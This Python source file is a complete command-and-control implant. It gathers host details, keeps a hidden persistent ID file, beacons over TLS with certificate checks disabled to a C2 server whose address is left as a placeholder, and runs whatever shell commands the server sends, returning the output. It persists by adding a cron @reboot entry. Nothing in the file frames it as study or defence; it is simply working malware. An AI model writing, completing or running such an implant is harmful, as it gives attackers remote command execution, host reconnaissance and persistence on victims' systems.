import socket
import json
import platform
import getpass
import uuid
import time
import os
import subprocess
import sys
import ssl


C2_IP = IP_HOST # Adapt according to your network
C2_PORT = 9999
AGENT_ID_FILE = "/tmp/.conf-C0"  # File to retain the same ID between sessions

def get_python_version():
    return sys.version.split()[0]

def get_agent_id():
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, "r") as f:
            return f.read().strip()
    new_id = str(uuid.uuid4())
    with open(AGENT_ID_FILE, "w") as f:
        f.write(new_id)
    return new_id

def get_ip_address():
    try:
        # Try to connect externally to retrieve the actual local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def get_linux_distribution():
    try:
        return subprocess.check_output("lsb_release -d", shell=True).decode().split(":")[1].strip()
    except:
        return platform.platform()

def get_system_info():
    return {
        "id": get_agent_id(),
        "hostname": socket.gethostname(),
        "ip": get_ip_address(),
        "os": get_linux_distribution(),
        "user": getpass.getuser(),
        "python-version" : get_python_version()
    }

def send_to_c2():
    data = get_system_info()
    context = ssl.create_default_context()
    # Ignore verification if it’s a self-signed certificate
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        with socket.create_connection((C2_IP, C2_PORT)) as sock:
            with context.wrap_socket(sock, server_hostname=C2_IP) as ssock:
                ssock.sendall(json.dumps(data).encode())

                # Waiting for command
                response = ssock.recv(4096).decode()
                if response:
                    res_data = json.loads(response)
                    command = res_data.get("command")
                    if command:
                        result = subprocess.getoutput(command)

                        # New connection to send the result
                        time.sleep(1)
                        with socket.create_connection((C2_IP, C2_PORT)) as result_sock:
                            with context.wrap_socket(result_sock, server_hostname=C2_IP) as ssl_result_sock:
                                result_payload = {
                                    "id": data["id"],
                                    "result": result
                                }
                                ssl_result_sock.sendall(json.dumps(result_payload).encode())

                                # Optional: read server response (avoid broken pipe)
                                try:
                                    ssl_result_sock.settimeout(2)
                                    server_ack = ssl_result_sock.recv(1024).decode()
                                except socket.timeout:
                                    pass
    except Exception as e:
        pass

def make_permanent():
    os.system('crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 ~/.config/setup.py" | crontab -')

if __name__ == "__main__":
    make_permanent()
    while True:
        send_to_c2()
        time.sleep(3) 
